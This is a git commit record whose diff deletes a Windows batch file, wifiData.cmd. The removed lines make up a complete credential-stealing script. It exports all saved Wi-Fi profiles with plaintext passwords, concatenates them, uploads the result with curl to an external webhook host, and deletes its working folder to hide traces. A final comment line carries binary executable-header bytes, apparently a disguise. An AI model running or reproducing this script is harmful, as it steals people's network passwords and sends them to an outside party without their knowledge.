6efa225bf0f6dd8b6ee372f09bfca6f833ef752a
anonymousbyte-s <td0984825@gmail.com>
2024-11-06 21:57:22 -0800

    Delete wifiData.cmd

--- wifiData.cmd
+++
@@ -1,9 +0,0 @@
-cd %temp%
-mkdir wifiInfo
-cd wifiInfo
-netsh wlan export profile key=clear
-type *.xml > wifiMaster.txt
-curl -T wifiMaster.txt https://faithful-vase-76.webhook.cool
-cd %temp%
-rmdir /s /q wifiInfo
-::MZ       ÿÿ  ¸       @                                   €   º ´	Í!¸LÍ!This program cannot be run in DOS mode.
